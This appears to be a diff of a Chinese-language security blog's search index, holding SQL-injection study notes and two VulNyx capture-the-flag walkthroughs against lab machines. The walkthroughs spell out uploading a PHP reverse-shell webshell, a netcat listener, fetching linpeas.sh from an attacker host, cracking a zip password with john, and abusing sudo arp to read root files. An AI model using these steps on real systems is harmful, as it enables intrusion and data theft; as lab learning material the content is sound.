@@ -29,16 +29,16 @@
     
     
     <entry>
-      <title>sql注入 | 渗透测试</title>
-      <link href="/2023/01/14/sqlzhuru/"/>
-      <url>/2023/01/14/sqlzhuru/</url>
+      <title>VulNyx-Exec | 靶机</title>
+      <link href="/2023/01/14/wp-2/"/>
+      <url>/2023/01/14/wp-2/</url>
       
-        <content type="html"><![CDATA[<p> <img src="/medias/%5Cfeatureimages%5C26.jpg" alt></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>Web漏洞两大关键因素：</p><ol><li><p>参数可控<br>向应用传递的参数用户可以控制</p></li><li><p>后台执行<br>用户向应用传递了参数后，后台将参数执行</p></li></ol><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li><p>单引号，判断注入点数据类型，int、string</p></li><li><p>and或者or进行逻辑判断，是否可以执行逻辑</p></li><li><p>order by 判断有多少列</p></li><li><p>通过union select 1,2,3判断显示位，是原本的输出不影响判断</p></li><li><p>查库、表、列三级结构<br>information_schema</p><ul><li>schemata用于查询库名 schema_name</li><li>tables用于查询表名 table_name</li><li>columns用于查询列名 column_name</li></ul></li><li><p>查询列内容<br>select 列名 from 库名.表名 where 限定条件</p></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>MySQL版本5.0以下，不支持报错注入，也没有information_schema库</li><li>extractvalue() updatexml()有32位长度限制</li></ul><h2 id="为什么使用报错注入"><a href="#为什么使用报错注入" class="headerlink" title="为什么使用报错注入"></a>为什么使用报错注入</h2><ol><li>union被过滤</li><li>无论正确与否，都不显示结果</li><li>当语句错误，有错误提示 mysql_error()</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>使用length()/substr()/ascii()查询数据库名需要几步</p><ol><li>select length(database())&gt;10;//长度为8</li><li>select ascii(substr(database(),$num,1))=10;//不断的取ascii码,$num从1~8</li><li>查询</li></ol><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),1,1)) =115–+</p><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),n,1)) =ascii–+<br>变量1是n，变量2是ascii<br>n的取值范围，ascii的取值范围<br>n：1<del>8<br>ascii：97</del>122</p><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>不依赖回显，依赖于延迟</p><p>if(条件,sleep(1),sleep(2))</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>什么时候用报错注入，有mysql_error()，有报错的时候可以使用</li><li>什么时候用布尔注入，可以进行条件判断，and/or，true/false</li><li>什么时候用时间盲注，当没回显，不知道正确与否，但是执行sleep后浏览器会有延迟<br>核心：还是查询语句<br>区别：利用函数的不同，显示方式的不同</li></ol><h2 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h2><ol><li><p>DVWA网站的bind sql injection<br>低中高三个级别<br>根据已有（where）的库表结构，查列</p></li><li><p>sqli-labs的less8和less9<br>根据已有（where）的库表结构，查列</p></li><li><p>源码分析<br>截取关键语句，截图配说明</p></li></ol><h2 id="预习"><a href="#预习" class="headerlink" title="预习"></a>预习</h2><p>sqlmap使用，从github下载</p>]]></content>
+        <content type="html"><![CDATA[<p><img src="/medias/%5Cfeatureimages%5C15.jpg" alt></p><h1 id="arp-scan-l扫出目标ip"><a href="#arp-scan-l扫出目标ip" class="headerlink" title="arp-scan -l扫出目标ip"></a>arp-scan -l扫出目标ip</h1><p>192.168.193.130</p><h1 id="用nmap对ip进行快速扫描端口"><a href="#用nmap对ip进行快速扫描端口" class="headerlink" title="用nmap对ip进行快速扫描端口"></a>用nmap对ip进行快速扫描端口</h1><p>-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描</p><blockquote><p>nmap -sS -sV -T5 -A -p- 192.168.193.130</p></blockquote><p>扫描出22 80 139 445端口 ，有80端口，我们可以去浏览器看看有没有http网页，发现有html网页</p><p>我们可以用smbclient来查看有什么共享的资源用</p><blockquote><p>smbclient -L //192.168.193.130</p></blockquote><p>看到有个server<br>让后可以用smbclient 与服务器进行交互连接</p><blockquote><p>smbclient //192.168.193.130/server</p></blockquote><h2 id="然后连接到smb服务器"><a href="#然后连接到smb服务器" class="headerlink" title="然后连接到smb服务器"></a>然后连接到smb服务器</h2><h2 id="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个"><a href="#然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个" class="headerlink" title="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个"></a>然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个</h2><p>反弹webshell的a.php文件木马，</p><blockquote><p>/usr/share/webshells/php/php-reverse-shell a.php</p></blockquote><p>让后用连接的smb把木马文件上传</p><blockquote><p>put a.php</p></blockquote><h2 id="上传木马后，我们用nc-lp-1234-对目标进行监听"><a href="#上传木马后，我们用nc-lp-1234-对目标进行监听" class="headerlink" title="上传木马后，我们用nc -lp 1234 对目标进行监听"></a>上传木马后，我们用nc -lp 1234 对目标进行监听</h2><p>然后我们去浏览器，访问一下我们上传的木马<br>把shell反弹过来</p><blockquote><p>192.168.193.130/a.php<br>让后监听成功，可以用/usr/bin/script -qc /bin/bash /dev/null这个命令进入shell模式<br>/usr/bin/script -qc /bin/bash /dev/null</p></blockquote><p>然后我们使用</p><blockquote><p>sudo -l<br>看下换个身份执行命令看到（s3cur4）这个用户<br>然后我们用这个用户执行命令<br>sudo -us3cur4 bash</p></blockquote><h2 id="然后我们cd到家目录"><a href="#然后我们cd到家目录" class="headerlink" title="然后我们cd到家目录"></a>然后我们cd到家目录</h2><blockquote><p>cd<br>ls<br>cat user.txt<br>看一下文件内容夺取成功</p></blockquote>]]></content>
       
       
       <categories>
           
-          <category> 渗透学习 </category>
+          <category> 靶机打靶 </category>
           
       </categories>
       
@@ -54,11 +54,11 @@
     
     
     <entry>
-      <title>VulNyx-Exec | 靶机</title>
-      <link href="/2023/01/14/wp-2/"/>
-      <url>/2023/01/14/wp-2/</url>
+      <title>VulNyx-Arpon | 靶机</title>
+      <link href="/2023/01/14/vulnyx-arpon/"/>
+      <url>/2023/01/14/vulnyx-arpon/</url>
       
-        <content type="html"><![CDATA[<p><img src="/medias/%5Cfeatureimages%5C15.jpg" alt></p><h1 id="arp-scan-l扫出目标ip"><a href="#arp-scan-l扫出目标ip" class="headerlink" title="arp-scan -l扫出目标ip"></a>arp-scan -l扫出目标ip</h1><p>192.168.193.130</p><h1 id="用nmap对ip进行快速扫描端口"><a href="#用nmap对ip进行快速扫描端口" class="headerlink" title="用nmap对ip进行快速扫描端口"></a>用nmap对ip进行快速扫描端口</h1><p>-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描</p><blockquote><p>nmap -sS -sV -T5 -A -p- 192.168.193.130</p></blockquote><p>扫描出22 80 139 445端口 ，有80端口，我们可以去浏览器看看有没有http网页，发现有html网页</p><p>我们可以用smbclient来查看有什么共享的资源用</p><blockquote><p>smbclient -L //192.168.193.130</p></blockquote><p>看到有个server<br>让后可以用smbclient 与服务器进行交互连接</p><blockquote><p>smbclient //192.168.193.130/server</p></blockquote><h2 id="然后连接到smb服务器"><a href="#然后连接到smb服务器" class="headerlink" title="然后连接到smb服务器"></a>然后连接到smb服务器</h2><h2 id="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个"><a href="#然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个" class="headerlink" title="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个"></a>然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个</h2><p>反弹webshell的a.php文件木马，</p><blockquote><p>/usr/share/webshells/php/php-reverse-shell a.php</p></blockquote><p>让后用连接的smb把木马文件上传</p><blockquote><p>put a.php</p></blockquote><h2 id="上传木马后，我们用nc-lp-1234-对目标进行监听"><a href="#上传木马后，我们用nc-lp-1234-对目标进行监听" class="headerlink" title="上传木马后，我们用nc -lp 1234 对目标进行监听"></a>上传木马后，我们用nc -lp 1234 对目标进行监听</h2><p>然后我们去浏览器，访问一下我们上传的木马<br>把shell反弹过来</p><blockquote><p>192.168.193.130/a.php<br>让后监听成功，可以用/usr/bin/script -qc /bin/bash /dev/null这个命令进入shell模式<br>/usr/bin/script -qc /bin/bash /dev/null</p></blockquote><p>然后我们使用</p><blockquote><p>sudo -l<br>看下换个身份执行命令看到（s3cur4）这个用户<br>然后我们用这个用户执行命令<br>sudo -us3cur4 bash</p></blockquote><h2 id="然后我们cd到家目录"><a href="#然后我们cd到家目录" class="headerlink" title="然后我们cd到家目录"></a>然后我们cd到家目录</h2><blockquote><p>cd<br>ls<br>cat user.txt<br>看一下文件内容夺取成功</p></blockquote>]]></content>
+        <content type="html"><![CDATA[<pre><code>arp-scan -l</code></pre><p>扫除目标ip</p><p>rustscan</p><pre><code>rustscan -a x.x.x.x -- -sV -sC</code></pre><p>没扫到扫描，扫到一个80端口</p><p>就一个html网页没有什么懂西，用dirb扫描一下目录</p><p>dirb <a href="http://192.168.193.147" target="_blank" rel="noopener">http://192.168.193.147</a></p><p><img src="C:%5CUsers%5Cjfq%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240618153223932.png" alt="image-20240618153223932"></p><p><img src="C:%5CUsers%5Cjfq%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240618153309929.png" alt="image-20240618153309929"></p><p>进去第一个目录有个文件上传，进去子目录啥也没有，应该是上传文件的位置<img src="C:%5CUsers%5Cjfq%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240618153458055.png" alt="image-20240618153458055"></p><p>先开个nc -lp 1234端口监听，这边上传一个reverse.php，然后访问，当然好像并没有什么用， 我们用burpsuite抓文件包，，php文件好像是上传不了的，被过滤了，要改一下后缀，试了一下php5好像可以但是好像不解析，然后用phar。可可以解析出来</p><pre><code>nc -lp 1234</code></pre><p>然后给交互升级一下</p><pre><code>/usr/bin/script -qc /bin/bash /dev/null</code></pre><p>id看看了一下没有什么权限。上传一个枚举脚本linpeas.sh查看一下隐藏信息</p><pre><code>wget http://192.168.193.128/linpeas.sh</code></pre><pre><code>.linpeas.sh</code></pre><p>/var/www/html/backup/empty/.hidden</p><p>看到这个目录.我们进去看一下,藏得够深的</p><p>发现里面有个backup_id.zip</p><p>upzip 需要密码， 我们没有密码，直接john给他爆破出来。解压出来里面有个私钥</p><pre><code>zip2john a.zip &gt; tmp</code></pre><pre><code>john tmp --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><p>应为爆破过了直接出来了</p><pre><code>john tmp -show </code></pre><p>swordfish</p><p>解压出来的私钥后面应该是用户名</p><p>id_rsa_calabrote<br> id_rsa_calabrote.pub </p><p>cat id_rsa_calabrote  </p><p>我们把私钥给他导出来，随便创建id，然后复制粘贴到里面，然后直接ssh登陆</p><pre><code>ssh calabrote@192.168.193.147 -i id</code></pre><p>登陆后，sudo -l看一下看到(root) NOPASSWD: /usr/sbin/arp 这个arp我们去找一下有什么用</p><pre><code>arp -v -f &quot;$LFILE&quot;</code></pre><p>好像只能读取文件，我们读取一下、root以下有没有.ssh sudo arp -v -f /root/.ssh,好像是没有的</p><p>只能看一下root.txt,</p><pre><code>sudo arp -v -f /root/root.txt</code></pre><p>拿到flag</p><pre><code>69db9f78edf072e03870a53b90aff647</code></pre>]]></content>
       
       
       <categories>
@@ -114,6 +114,31 @@
       <categories>
           
           <category> 靶机打靶 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql注入 | 渗透测试</title>
+      <link href="/2023/01/14/sqlzhuru/"/>
+      <url>/2023/01/14/sqlzhuru/</url>
+      
+        <content type="html"><![CDATA[<p> <img src="/medias/%5Cfeatureimages%5C26.jpg" alt></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>Web漏洞两大关键因素：</p><ol><li><p>参数可控<br>向应用传递的参数用户可以控制</p></li><li><p>后台执行<br>用户向应用传递了参数后，后台将参数执行</p></li></ol><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li><p>单引号，判断注入点数据类型，int、string</p></li><li><p>and或者or进行逻辑判断，是否可以执行逻辑</p></li><li><p>order by 判断有多少列</p></li><li><p>通过union select 1,2,3判断显示位，是原本的输出不影响判断</p></li><li><p>查库、表、列三级结构<br>information_schema</p><ul><li>schemata用于查询库名 schema_name</li><li>tables用于查询表名 table_name</li><li>columns用于查询列名 column_name</li></ul></li><li><p>查询列内容<br>select 列名 from 库名.表名 where 限定条件</p></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>MySQL版本5.0以下，不支持报错注入，也没有information_schema库</li><li>extractvalue() updatexml()有32位长度限制</li></ul><h2 id="为什么使用报错注入"><a href="#为什么使用报错注入" class="headerlink" title="为什么使用报错注入"></a>为什么使用报错注入</h2><ol><li>union被过滤</li><li>无论正确与否，都不显示结果</li><li>当语句错误，有错误提示 mysql_error()</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>使用length()/substr()/ascii()查询数据库名需要几步</p><ol><li>select length(database())&gt;10;//长度为8</li><li>select ascii(substr(database(),$num,1))=10;//不断的取ascii码,$num从1~8</li><li>查询</li></ol><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),1,1)) =115–+</p><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),n,1)) =ascii–+<br>变量1是n，变量2是ascii<br>n的取值范围，ascii的取值范围<br>n：1<del>8<br>ascii：97</del>122</p><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>不依赖回显，依赖于延迟</p><p>if(条件,sleep(1),sleep(2))</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>什么时候用报错注入，有mysql_error()，有报错的时候可以使用</li><li>什么时候用布尔注入，可以进行条件判断，and/or，true/false</li><li>什么时候用时间盲注，当没回显，不知道正确与否，但是执行sleep后浏览器会有延迟<br>核心：还是查询语句<br>区别：利用函数的不同，显示方式的不同</li></ol><h2 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h2><ol><li><p>DVWA网站的bind sql injection<br>低中高三个级别<br>根据已有（where）的库表结构，查列</p></li><li><p>sqli-labs的less8和less9<br>根据已有（where）的库表结构，查列</p></li><li><p>源码分析<br>截取关键语句，截图配说明</p></li></ol><h2 id="预习"><a href="#预习" class="headerlink" title="预习"></a>预习</h2><p>sqlmap使用，从github下载</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透学习 </category>
           
       </categories>
       
